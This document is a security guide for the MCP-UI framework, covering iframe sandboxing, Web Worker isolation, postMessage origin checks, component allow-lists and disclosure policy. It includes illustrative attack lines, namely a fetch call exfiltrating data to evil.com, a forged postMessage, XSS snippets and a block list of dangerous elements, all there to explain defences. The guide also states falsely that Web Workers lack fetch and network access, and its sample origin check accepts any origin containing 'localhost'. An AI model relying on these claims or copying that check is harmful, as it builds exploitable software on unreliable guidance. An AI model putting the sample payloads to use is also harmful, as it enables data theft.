# MCP-UI Security Guide

**Version**: 1.0.0 (Layer 5 - Production Ready)
**Last Updated**: 2025-10-16

---

## Table of Contents

1. [Overview](#overview)
2. [Security Architecture](#security-architecture)
3. [iframe Sandboxing](#iframe-sandboxing)
4. [Web Worker Isolation](#web-worker-isolation)
5. [Origin Validation](#origin-validation)
6. [Component Whitelisting](#component-whitelisting)
7. [Best Practices](#best-practices)
8. [Common Security Mistakes](#common-security-mistakes)
9. [Security Checklist](#security-checklist)
10. [Reporting Security Issues](#reporting-security-issues)

---

## Overview

MCP-UI is designed with security as a first-class concern. This guide explains the security model, protections in place, and best practices for building secure UI resources.

### Security Principles

1. **Defense in Depth** - Multiple layers of security protection
2. **Least Privilege** - Minimal permissions granted by default
3. **Secure by Default** - Safe configuration out of the box
4. **Fail Securely** - Errors don't compromise security
5. **Clear Security Boundaries** - Well-defined trust zones

### Threat Model

MCP-UI protects against:

- **Malicious Server Content** - Untrusted servers providing harmful UI resources
- **Cross-Site Scripting (XSS)** - Injected scripts accessing parent application
- **Clickjacking** - UI overlays tricking users into unintended actions
- **Data Exfiltration** - Stealing sensitive data from parent application
- **Denial of Service** - Resource exhaustion or infinite loops
- **Privilege Escalation** - UI gaining unintended capabilities

---

## Security Architecture

### Three-Layer Security Model

```
┌─────────────────────────────────────────────────────────────┐
│  Parent Application (Trusted)                               │
│  - Full DOM access                                          │
│  - Network access                                           │
│  - User data access                                         │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │  Security Boundary #1: iframe Sandbox                 │ │
│  │  - Limited DOM access                                 │ │
│  │  - No same-origin access (inline HTML)               │ │
│  │  - Scripts allowed, but isolated                     │ │
│  │  - postMessage only communication                    │ │
│  │                                                       │ │
│  │  ┌─────────────────────────────────────────────────┐ │ │
│  │  │  Security Boundary #2: Web Worker             │ │ │
│  │  │  - No DOM access at all                        │ │ │
│  │  │  - No network access                           │ │ │
│  │  │  - Pure computation only                       │ │ │
│  │  │  - postMessage only communication              │ │ │
│  │  │                                                 │ │ │
│  │  │  ┌───────────────────────────────────────────┐ │ │ │
│  │  │  │  Security Boundary #3: Component Whitelist│ │ │ │
│  │  │  │  - Only safe React components allowed     │ │ │ │
│  │  │  │  - No custom elements                     │ │ │ │
│  │  │  │  - No dangerous attributes                │ │ │ │
│  │  │  └───────────────────────────────────────────┘ │ │ │
│  │  └─────────────────────────────────────────────────┘ │ │
│  └───────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### Data Flow Security

```
Server → MCP Protocol → Client App → Security Validation → Renderer

Each step includes validation:
1. Server: URI validation, content type validation
2. Protocol: MCP schema validation
3. Client App: Resource structure validation
4. Security: Origin checks, sandbox setup
5. Renderer: Component whitelisting, attribute sanitization
```

---

## iframe Sandboxing

### What is iframe Sandboxing?

The HTML5 `sandbox` attribute restricts what an iframe can do. By default, a sandboxed iframe has NO permissions - we explicitly enable only what's needed.

### Default Permissions

**Inline HTML Resources (`text/html`):**

```html
<iframe sandbox="allow-scripts">
```

**Permissions Granted:**
- ✅ Run JavaScript
- ❌ Same-origin access (cannot read parent DOM)
- ❌ Forms submission
- ❌ Top-level navigation
- ❌ Popups
- ❌ Pointer lock
- ❌ Automatic features

**Why This is Safe:**
- Scripts run but are isolated
- Cannot access parent application data
- Cannot navigate parent window
- Cannot open popups or new windows
- Can only communicate via postMessage

---

**External URL Resources (`text/uri-list`):**

```html
<iframe sandbox="allow-scripts allow-same-origin">
```

**Additional Permission:**
- ✅ Same-origin access (for API calls to same domain)

**Why This is Needed:**
- External URLs often need to make API calls to their own backend
- Without `allow-same-origin`, CORS requests fail
- Still isolated from parent application

**Trade-off:**
- Slightly less secure than inline HTML
- External domain must be trusted
- HTTPS required to prevent MITM attacks

---

### Sandbox Permissions Explained

| Permission | What It Allows | Inline HTML | External URL | Security Risk |
|------------|---------------|-------------|--------------|---------------|
| `allow-scripts` | Run JavaScript | ✅ | ✅ | Medium - needed for interactivity |
| `allow-same-origin` | Same-origin API calls | ❌ | ✅ | High - allows storage access |
| `allow-forms` | Submit forms | ❌ | ❌ | Medium - can POST data |
| `allow-top-navigation` | Navigate parent | ❌ | ❌ | Critical - allows phishing |
| `allow-popups` | Open new windows | ❌ | ❌ | High - allows popups |
| `allow-pointer-lock` | Lock mouse pointer | ❌ | ❌ | Low - UX issue |
| `allow-modals` | alert/confirm/prompt | ❌ | ❌ | Medium - annoying dialogs |

---

### Custom Sandbox Permissions

For advanced use cases, you can override sandbox permissions:

```tsx
<UIResourceRenderer
  resource={resource}
  customSandboxPermissions="allow-scripts allow-forms"
/>
```

**⚠️ WARNING:** Only use custom permissions if you fully understand the security implications.

**Safe Additional Permissions:**
- `allow-forms` - If you need form submissions

**Dangerous Permissions (Never Use):**
- `allow-top-navigation` - Allows phishing attacks
- `allow-same-origin` (for inline HTML) - Breaks isolation
- `allow-popups` - Allows spam popups

---

### Testing Sandbox Isolation

```typescript
// Test: Can iframe access parent DOM?
const testResource = createInlineHTMLResource(
  'ui://security-test',
  `
    <script>
      try {
        // This should FAIL in sandboxed iframe
        console.log(window.parent.document.body);
        alert('SECURITY BREACH: Can access parent DOM!');
      } catch (error) {
        console.log('✅ Sandbox working: Cannot access parent DOM');
      }
    </script>
    <div>Sandbox test running...</div>
  `
);
```

Expected result: Error thrown, cannot access parent DOM.

---

## Web Worker Isolation

### What are Web Workers?

Web Workers run JavaScript in a separate thread with NO access to:
- DOM (no `document`, no `window.document`)
- Browser APIs (no `localStorage`, no `fetch` outside worker)
- Parent page variables
- Browser history

They can ONLY:
- Execute pure JavaScript
- Send/receive messages via `postMessage`
- Use basic APIs (`console`, `setTimeout`, math operations)

### Why Web Workers for Remote DOM?

**Security Benefits:**

1. **No DOM Access:**
```javascript
// Inside Web Worker - ALL of these fail:
document.querySelector('.sensitive-data'); // Error: document is not defined
window.parent.location.href;              // Error: window.parent is undefined
localStorage.getItem('token');             // Error: localStorage is not defined
fetch('https://evil.com/steal-data');     // Error: fetch is not defined
```

2. **No Network Access:**
```javascript
// Cannot make HTTP requests
// Cannot connect to WebSockets
// Cannot send data anywhere
```

3. **Pure Computation Only:**
```javascript
// Can only create virtual DOM and send messages:
const div = remoteDOM.createElement('div'); // ✅ Safe
remoteDOM.callHost('action', { data }); // ✅ Controlled communication
```

---

### Remote DOM Security Model

**How It Works:**

```
┌──────────────────────────────────────────────────────────┐
│ Web Worker (Untrusted Code)                             │
│                                                          │
│  User Script:                                            │
│  ┌────────────────────────────────────────────────────┐ │
│  │ const btn = remoteDOM.createElement('button');     │ │
│  │ remoteDOM.setTextContent(btn, 'Click Me');        │ │
│  │ remoteDOM.addEventListener(btn, 'click', () => {  │ │
│  │   remoteDOM.callHost('notify', { msg: 'Hi!' }); │ │
│  │ });                                               │ │
│  └────────────────────────────────────────────────────┘ │
│                          ↓                               │
│                    postMessage                           │
│              (DOM operation messages)                    │
└──────────────────────────────────────────────────────────┘
                           ↓
┌──────────────────────────────────────────────────────────┐
│ Host Receiver (Trusted Code)                            │
│                                                          │
│  1. Validate operation type                             │
│  2. Validate component name (whitelist)                 │
│  3. Sanitize attributes                                 │
│  4. Update virtual DOM                                  │
│  5. Render React components                             │
└──────────────────────────────────────────────────────────┘
```

**Every Operation is Validated:**

```typescript
// Inside HostReceiver
function processOperation(operation: any) {
  // 1. Validate structure
  if (!validateOperation(operation)) {
    console.warn('Invalid operation rejected');
    return;
  }

  // 2. Check operation type
  if (operation.type === 'createElement') {
    // 3. Validate component name
    if (!isAllowedComponent(operation.tagName)) {
      console.error(`Component not allowed: ${operation.tagName}`);
      return;
    }
    // 4. Sanitize props
    const sanitizedProps = sanitizeProps(operation.props);
    // 5. Create element
    createElement(operation.id, operation.tagName, sanitizedProps);
  }
}
```

---

### Remote DOM API Security

**Safe API:**

```javascript
// ✅ All of these are safe:
remoteDOM.createElement('div', { style: { color: 'red' } });
remoteDOM.setAttribute(id, 'class', 'button');
remoteDOM.appendChild(parentId, childId);
remoteDOM.setTextContent(id, 'Hello');
remoteDOM.addEventListener(id, 'click', () => {
  console.log('Safe event handler');
});
remoteDOM.callHost('notify', { message: 'Safe action' });
```

**Blocked Operations:**

```javascript
// ❌ These don't exist in Worker:
document.querySelector('#password-field'); // Error: document is not defined
window.location.href = 'https://evil.com'; // Error: window is undefined
eval('malicious code'); // Blocked by Content Security Policy
new Function('return secrets')(); // Blocked
```

**Sanitization:**

```javascript
// Dangerous props are filtered:
const props = {
  onClick: 'javascript:alert(1)', // ❌ Removed (function expected)
  dangerouslySetInnerHTML: '<script>', // ❌ Removed (not in whitelist)
  style: { background: 'red' }, // ✅ Allowed
  className: 'button', // ✅ Allowed
};

const sanitized = sanitizeProps(props);
// Result: { style: { background: 'red' }, className: 'button' }
```

---

## Origin Validation

### Why Origin Validation Matters

`postMessage` allows cross-origin communication, which is powerful but dangerous without validation.

**Attack Scenario Without Validation:**

```javascript
// Malicious website injects iframe
<iframe src="https://your-app.com/mcp-ui"></iframe>

// Malicious script sends fake messages
iframe.contentWindow.postMessage({
  type: 'tool',
  payload: { name: 'delete-all-data' }
}, '*');
```

**With Origin Validation:**

```javascript
window.addEventListener('message', (event) => {
  // ✅ Check origin before processing
  if (!validateOrigin(event.origin)) {
    console.warn('Rejected message from:', event.origin);
    return;
  }

  // Only trusted origins reach here
  handleUIAction(event.data);
});
```

---

### Origin Validation Implementation

**What We Check:**

```typescript
function validateOrigin(origin: string): boolean {
  // 1. Allow same-origin (most common case)
  if (origin === window.location.origin) {
    return true;
  }

  // 2. Allow null origin (for inline HTML srcdoc)
  if (origin === 'null') {
    return true;
  }

  // 3. Allow localhost for development
  if (origin.includes('localhost') || origin.includes('127.0.0.1')) {
    return true;
  }

  // 4. Check against allowed origins list (if configured)
  if (allowedOrigins.includes(origin)) {
    return true;
  }

  // 5. HTTPS requirement for external origins
  try {
    const url = new URL(origin);
    if (url.protocol !== 'https:') {
      return false;
    }
  } catch {
    return false;
  }

  return false;
}
```

---

### Configuring Allowed Origins

For external URLs that need to send messages:

```typescript
// In your application
const allowedOrigins = [
  'https://trusted-dashboard.example.com',
  'https://analytics.example.com'
];

function handleMessage(event: MessageEvent) {
  if (!allowedOrigins.includes(event.origin)) {
    console.warn('Blocked message from:', event.origin);
    return;
  }
  // Process message
}
```

---

### Testing Origin Validation

```typescript
// Test: Try sending message from wrong origin
// Open browser console on different domain
window.postMessage({
  type: 'tool',
  payload: { name: 'test' }
}, 'https://your-app.com');

// Expected: Message rejected with warning in console
```

---

## Component Whitelisting

### Why Component Whitelisting?

React allows rendering any component, including potentially dangerous ones:

```javascript
// ❌ Dangerous if allowed:
React.createElement('script', {}, 'alert(1)'); // XSS
React.createElement('iframe', { src: 'https://evil.com' }); // Embedding attack
React.createElement('object', { data: 'malicious.swf' }); // Flash exploit
React.createElement('CustomEvilComponent', {}); // Unknown component
```

### Allowed Components

**Basic Elements:**
- `div`, `span`, `p`
- `h1`, `h2`, `h3`, `h4`, `h5`, `h6`
- `section`, `article`, `header`, `footer`, `nav`

**Form Elements:**
- `button`, `input`, `textarea`, `select`, `option`, `label`, `form`

**List Elements:**
- `ul`, `ol`, `li`

**Text Elements:**
- `strong`, `em`, `code`, `pre`, `blockquote`

**Other:**
- `a`, `img`, `br`, `hr`, `table`, `tr`, `td`, `th`

---

### Component Validation

```typescript
const ALLOWED_COMPONENTS = new Set([
  'div', 'span', 'p', 'h1', 'h2', 'h3', 'button', 'input',
  'textarea', 'select', 'option', 'label', 'form', 'ul', 'ol', 'li',
  'a', 'img', 'code', 'pre', 'br', 'hr', 'table', 'tr', 'td', 'th'
]);

function isAllowedComponent(tagName: string): boolean {
  return ALLOWED_COMPONENTS.has(tagName.toLowerCase());
}

function createRemoteComponent(
  tagName: string,
  props: any,
  children?: any
): React.ReactElement {
  // Validate component name
  if (!isAllowedComponent(tagName)) {
    console.error(`Component not allowed: ${tagName}`);
    return React.createElement('div', {}, 'Invalid component');
  }

  // Create component
  return React.createElement(tagName, props, children);
}
```

---

### Blocked Components

**Never Allowed:**

```javascript
// ❌ Script execution
'script', 'style' (inline JS/CSS injection risk)

// ❌ Embedding content
'iframe', 'embed', 'object', 'applet' (embedding attacks)

// ❌ Web Components
'custom-element' or any hyphenated tags (unknown behavior)

// ❌ React-specific
dangerouslySetInnerHTML prop (XSS risk)
__html property (XSS risk)

// ❌ Event handlers as strings
onclick="..." (use addEventListener instead)
```

---

### Requesting New Components

If you need a component not in the whitelist:

1. **Check if it's actually needed** - Can you use an allowed component instead?
2. **Assess security risk** - What can this component do?
3. **Propose addition** - Open a GitHub issue with:
   - Component name
   - Use case
   - Security analysis
   - Alternative approaches considered

**Example Approved Addition:**

```
Component: <svg>
Use Case: Vector graphics for charts/icons
Security: Safe - no script execution, no external resources
Approved: Yes
```

**Example Rejected Addition:**

```
Component: <iframe>
Use Case: Embed external content
Security: High risk - allows arbitrary embedding
Alternative: Use external URL resources instead
Approved: No
```

---

## Best Practices

### Server-Side Security

**1. Validate All Inputs:**

```typescript
server.addUIResource(
  'ui://user-profile',
  'User Profile',
  'Display user profile',
  'text/html',
  (userId: string) => {
    // ✅ Validate input
    if (!isValidUserId(userId)) {
      throw new Error('Invalid user ID');
    }

    const user = getUserById(userId);

    // ✅ Escape HTML
    return `
      <div>
        <h2>${escapeHtml(user.name)}</h2>
        <p>${escapeHtml(user.bio)}</p>
      </div>
    `;
  }
);
```

**2. Use Escape Functions:**

```typescript
function escapeHtml(text: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, (m) => map[m]);
}

function escapeAttr(text: string): string {
  return text
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// Usage
const html = `
  <div>
    <p>${escapeHtml(userInput)}</p>
    <img src="photo.jpg" alt="${escapeAttr(userName)}" />
  </div>
`;
```

**3. Use Content Security Policy:**

```typescript
const htmlWithCSP = `
  <!DOCTYPE html>
  <html>
  <head>
    <meta http-equiv="Content-Security-Policy"
          content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';">
  </head>
  <body>
    <div>Secure content</div>
  </body>
  </html>
`;

createInlineHTMLResource('ui://secure', htmlWithCSP);
```

**4. Limit Dynamic Content Scope:**

```typescript
// ❌ Bad: Entire HTML is dynamic
server.addUIResource('ui://bad', 'Bad', 'desc', 'text/html',
  (userContent) => userContent // Direct user input!
);

// ✅ Good: User content is escaped and contained
server.addUIResource('ui://good', 'Good', 'desc', 'text/html',
  (userContent) => `
    <div class="container">
      <div class="user-content">
        ${escapeHtml(userContent)}
      </div>
    </div>
  `
);
```

---

### Client-Side Security

**1. Validate Resources Before Rendering:**

```tsx
function App({ resource }: { resource: any }) {
  // ✅ Validate before rendering
  if (!isUIResource(resource)) {
    return <div>Invalid resource</div>;
  }

  // ✅ Check resource origin if needed
  if (resource.resource.uri.startsWith('ui://external/')) {
    if (!isTrustedExternalResource(resource)) {
      return <div>Untrusted external resource blocked</div>;
    }
  }

  return <UIResourceRenderer resource={resource} />;
}
```

**2. Sanitize Action Payloads:**

```tsx
function App() {
  const handleAction = async (action: UIActionResult) => {
    // ✅ Validate action type
    const allowedTypes = ['tool', 'notify', 'link'];
    if (!allowedTypes.includes(action.type)) {
      console.warn('Unknown action type:', action.type);
      return;
    }

    // ✅ Sanitize payload
    const sanitizedPayload = sanitizeObject(action.payload);

    // ✅ Execute action
    await executeAction(action.type, sanitizedPayload);
  };

  return <UIResourceRenderer resource={resource} onUIAction={handleAction} />;
}
```

**3. Set Rate Limits:**

```tsx
import { throttle } from 'lodash';

function App() {
  // ✅ Throttle actions to prevent abuse
  const handleAction = throttle(
    async (action: UIActionResult) => {
      await processAction(action);
    },
    1000, // Max 1 action per second
    { leading: true, trailing: false }
  );

  return <UIResourceRenderer resource={resource} onUIAction={handleAction} />;
}
```

**4. Monitor for Suspicious Activity:**

```tsx
function App() {
  const [actionCount, setActionCount] = useState(0);

  const handleAction = async (action: UIActionResult) => {
    // ✅ Monitor action frequency
    setActionCount((c) => c + 1);

    if (actionCount > 100) {
      console.error('Suspicious activity detected: Too many actions');
      alert('Suspicious activity detected. Please refresh.');
      return;
    }

    await processAction(action);
  };

  return <UIResourceRenderer resource={resource} onUIAction={handleAction} />;
}
```

---

## Common Security Mistakes

### ❌ Mistake #1: Using `allow-same-origin` for Inline HTML

```typescript
// ❌ WRONG: Breaks isolation
<HTMLResourceRenderer
  resource={inlineHTML}
  isExternalUrl={false}
  customSandboxPermissions="allow-scripts allow-same-origin"
/>

// ✅ CORRECT: Scripts only
<HTMLResourceRenderer
  resource={inlineHTML}
  isExternalUrl={false}
  customSandboxPermissions="allow-scripts"
/>
```

**Why it's wrong:** `allow-same-origin` lets iframe access parent's localStorage, cookies, and DOM.

---

### ❌ Mistake #2: Not Validating Origins

```typescript
// ❌ WRONG: Accepts messages from any origin
window.addEventListener('message', (event) => {
  handleAction(event.data);
});

// ✅ CORRECT: Validates origin first
window.addEventListener('message', (event) => {
  if (!validateOrigin(event.origin)) {
    return;
  }
  handleAction(event.data);
});
```

---

### ❌ Mistake #3: Rendering Untrusted HTML Directly

```typescript
// ❌ WRONG: Direct HTML injection
const html = `<div>${userInput}</div>`;

// ✅ CORRECT: Escape HTML
const html = `<div>${escapeHtml(userInput)}</div>`;
```

---

### ❌ Mistake #4: Allowing Unvalidated Components

```typescript
// ❌ WRONG: No component validation
React.createElement(untrustedComponentName, props);

// ✅ CORRECT: Validate component first
if (isAllowedComponent(componentName)) {
  React.createElement(componentName, props);
}
```

---

### ❌ Mistake #5: Using HTTP URLs in Production

```typescript
// ❌ WRONG: HTTP allows MITM attacks
createExternalURLResource('ui://widget', 'http://example.com/widget');

// ✅ CORRECT: HTTPS required
createExternalURLResource('ui://widget', 'https://example.com/widget');
```

---

### ❌ Mistake #6: Exposing Sensitive Data in UI

```typescript
// ❌ WRONG: Sensitive data in HTML
const html = `
  <div>
    <p>API Key: ${apiKey}</p>
    <p>User ID: ${userId}</p>
  </div>
`;

// ✅ CORRECT: Never expose sensitive data
const html = `
  <div>
    <p>User ID: ${userId}</p>
    <!-- API key not included -->
  </div>
`;
```

---

### ❌ Mistake #7: No Error Handling

```typescript
// ❌ WRONG: Errors expose stack traces
server.addUIResource('ui://data', 'Data', 'desc', 'text/html',
  async () => {
    const data = await fetchSensitiveData();
    return `<div>${data}</div>`;
  }
);

// ✅ CORRECT: Handle errors gracefully
server.addUIResource('ui://data', 'Data', 'desc', 'text/html',
  async () => {
    try {
      const data = await fetchData();
      return `<div>${escapeHtml(data)}</div>`;
    } catch (error) {
      console.error('Error fetching data:', error);
      return '<div>Error loading data. Please try again.</div>';
    }
  }
);
```

---

## Security Checklist

Use this checklist before deploying MCP-UI to production:

### Server-Side

- [ ] All user inputs are validated
- [ ] All dynamic content is HTML-escaped
- [ ] No sensitive data (API keys, tokens) in UI resources
- [ ] URIs all start with `ui://`
- [ ] External URLs are HTTPS only
- [ ] Error messages don't expose internal details
- [ ] Content Security Policy headers set (if applicable)
- [ ] Resource size limits enforced

### Client-Side

- [ ] Resources validated before rendering
- [ ] `onUIAction` handler validates action types
- [ ] Action payloads are sanitized
- [ ] Origin validation enabled
- [ ] Rate limiting on actions implemented
- [ ] Error boundaries in place
- [ ] No custom sandbox permissions (unless absolutely needed)
- [ ] Monitoring for suspicious activity

### Remote DOM

- [ ] Only whitelisted components used
- [ ] No dangerous attributes (onclick, etc.)
- [ ] Event handlers are functions, not strings
- [ ] callHost payloads are sanitized
- [ ] Worker scripts validated before execution

### Testing

- [ ] XSS tests passed
- [ ] Origin validation tests passed
- [ ] Sandbox isolation tests passed
- [ ] Component whitelist tests passed
- [ ] Error handling tests passed
- [ ] Security audit completed

---

## Reporting Security Issues

If you discover a security vulnerability in MCP-UI:

### DO NOT:
- Open a public GitHub issue
- Disclose the vulnerability publicly
- Exploit the vulnerability

### DO:
1. Email security@example.com with:
   - Description of vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if any)

2. Allow reasonable time for fix (typically 90 days)

3. Coordinate disclosure timing

### Bug Bounty:
- We offer rewards for valid security vulnerabilities
- Severity assessed using CVSS score
- Rewards range from $100 to $5,000

### Recognition:
- Security researchers credited in SECURITY.md
- Listed in release notes (if desired)
- Public acknowledgment on blog

---

## Additional Resources

- **API Reference**: See `COMPLETE-API-REFERENCE.md` for API documentation
- **MDN Web Docs**: [iframe sandbox](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox)
- **MDN Web Docs**: [Web Workers](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API)
- **OWASP**: [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- **Content Security Policy**: [CSP Reference](https://content-security-policy.com/)

---

## Conclusion

MCP-UI is designed with multiple layers of security to protect both the parent application and users. By following this guide and the best practices outlined, you can build secure, interactive UI resources with confidence.

**Remember:** Security is a shared responsibility. The framework provides the foundation, but you must build securely on top of it.

Stay safe!

---

**End of Security Guide**
